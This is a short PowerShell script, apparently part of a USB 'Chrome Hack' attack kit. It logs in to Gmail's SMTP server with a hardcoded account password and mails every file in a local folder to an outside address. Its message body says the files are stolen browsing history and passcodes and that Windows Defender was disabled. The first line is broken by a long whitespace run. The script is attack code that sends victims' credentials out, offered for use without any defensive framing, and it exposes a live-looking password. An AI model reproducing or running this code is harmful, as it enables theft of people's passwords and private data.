$SMT                                                                                        PServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('wifigrabberpico@gmail.com', 'jc9ZZxW3BnR7Fz');
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'wifigrabberpico@gmail.com'
$ReportEmail.To.Add('mdeemant@gmail.com')
$ReportEmail.Subject = 'Chrome Hack'
$ReportEmail.Body = 'Atached is the browsing history and passcodes.And if you used the atack on a Windows PC, Windows Wefencer was disabled.' 
$files=Get-ChildItem "C:\l\"
Foreach($file in $files)
{
Write-Host “Attaching File :- ” $file
$attachment = New-Object System.Net.Mail.Attachment –ArgumentList C:\l\$file
$ReportEmail.Attachments.Add($attachment)
$SMTPInfo.Send($ReportEmail)
}
write-host "Mail Sent Successfully"
